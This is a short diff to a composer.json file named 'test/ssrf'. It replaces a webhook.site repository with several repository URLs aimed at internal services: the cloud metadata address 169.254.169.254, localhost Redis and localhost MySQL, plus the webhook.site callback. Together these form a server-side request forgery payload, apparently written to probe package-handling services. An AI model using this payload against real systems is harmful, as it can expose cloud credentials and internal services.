@@ -1,10 +1,10 @@
 {
     "name": "test/ssrf",
     "repositories": [
-        {
-            "type": "composer",
-            "url": " https://webhook.site/4f312a36-3a03-4f31-ac36-d8973f1855d9"
-        }
+        {"type": "composer", "url": "http://169.254.169.254/latest/meta-data/"},
+        {"type": "composer", "url": "http://localhost:6379"},
+        {"type": "composer", "url": "http://localhost:3306"},
+        {"type": "composer", "url": "https://webhook.site/4f312a36-3a03-4f31-ac36-d8973f1855d9"}
     ],
-    "require": {}
+    "require": {"test/package": "*"}
 }
